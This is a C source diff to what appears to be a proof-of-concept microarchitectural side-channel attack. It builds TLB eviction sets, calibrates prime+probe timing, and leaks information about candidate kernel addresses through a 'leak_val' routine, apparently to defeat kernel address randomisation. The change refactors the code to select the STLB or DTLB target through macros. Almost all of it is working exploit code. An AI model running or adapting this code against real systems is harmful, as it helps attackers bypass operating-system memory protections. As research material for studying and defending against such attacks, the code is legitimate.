@@ -13,6 +13,42 @@
 
 #define CALIBRATION_ITERS 100000
 
+#define PASTE3_INTERNAL(a, b, c) a##b##c
+#define PASTE3(a, b, c) PASTE3_INTERNAL(a, b, c)
+#define PASTE_INTERNAL(a, b) a##b
+#define PASTE(a, b) PASTE_INTERNAL(a, b)
+
+#define _EMPTY_SUFFIX
+
+#define CONFIG_TARGET_STLB 1
+// #define CONFIG_TARGET_DTLB 1
+
+#define USE_POINTER_CHASING 0
+
+#if defined(CONFIG_TARGET_STLB)
+#define TARGET_FUNC_SUFFIX stlb
+#define TARGET_MACRO_PREFIX STLB
+#elif defined(CONFIG_TARGET_DTLB)
+#define TARGET_FUNC_SUFFIX dtlb
+#define TARGET_MACRO_PREFIX DTLB
+#else
+#error                                                                         \
+    "No target TLB defined. Please define CONFIG_TARGET_STLB or CONFIG_TARGET_DTLB."
+#endif
+
+// --- Logic for Pointer Chasing ---
+#if USE_POINTER_CHASING
+#define CHASING_SUFFIX _pc
+#else
+#define CHASING_SUFFIX _EMPTY_SUFFIX
+#endif
+
+#define probe PASTE3(probe_, TARGET_FUNC_SUFFIX, CHASING_SUFFIX)
+#define gen_eset PASTE3(gen_eset_, TARGET_FUNC_SUFFIX, CHASING_SUFFIX)
+#define prime PASTE(prime_, TARGET_FUNC_SUFFIX)
+
+#define EVSET_SIZE PASTE(TARGET_MACRO_PREFIX, _EVSET_SIZE_4K)
+
 uint64_t *res;
 
 //------------------------//
@@ -27,37 +63,35 @@ int leak_val(void *addr) {
 }
 
 void get_cycle(uint64_t *valid_cycle, uint64_t *invalid_cycle) {
-  void *eset_dtlb[DTLB_EVSET_SIZE_4K];
-  void *eset_stlb[STLB_EVSET_SIZE_4K];
+  void *eset[EVSET_SIZE];
   register uint64_t tmp;
 
   char *test_addr;
   posix_memalign(&test_addr, PAGE_SIZE, PAGE_SIZE);
   *test_addr = 1;
-  gen_eset(test_addr, eset_stlb, eset_dtlb);
+  gen_eset(test_addr, eset);
 
   tmp = 0;
   for (int i = 0; i < CALIBRATION_ITERS; i++) {
-    prime(eset_stlb);
+    prime(eset);
     maccess(test_addr);
-    tmp += probe(eset_stlb);
+    tmp += probe(eset);
   }
 
   *valid_cycle = tmp / CALIBRATION_ITERS;
 
   tmp = 0;
   for (int i = 0; i < CALIBRATION_ITERS; i++) {
-    prime(eset_stlb);
+    prime(eset);
     memory_fence();
-    tmp += probe(eset_stlb);
+    tmp += probe(eset);
   }
   *invalid_cycle = tmp / CALIBRATION_ITERS;
 }
 
 int main(int argc, char *argv[]) {
   void *addr;
-  void *eset_dtlb[DTLB_EVSET_SIZE_4K];
-  void *eset_stlb[STLB_EVSET_SIZE_4K];
+  void *eset[EVSET_SIZE];
   void *target[TRAINING_ITERS] = {user, user, user, user, user, user};
   uint64_t valid_cycle, invalid_cycle;
   struct timeval tv_s, tv_e;
@@ -92,13 +126,13 @@ int main(int argc, char *argv[]) {
       idx = (s_idx * 73) % NUM_SLOT;
       addr = (void *)KERN_MAP_MIN_ADDR + (ALIGN_SIZE * idx);
       target[TRAINING_ITERS - 1] = addr;
-      gen_eset(addr, eset_dtlb, eset_stlb);
+      gen_eset(addr, eset);
       do {
         for (int j = 0; j < TRAINING_ITERS; j++) {
-          prime(eset_stlb);
+          prime(eset);
           leak_val(target[j]);
         }
-        tmp = probe(eset_stlb);
+        tmp = probe(eset);
       } while (tmp < (invalid_cycle - 200) || tmp > (valid_cycle + 200));
       res[idx] += tmp;
     }
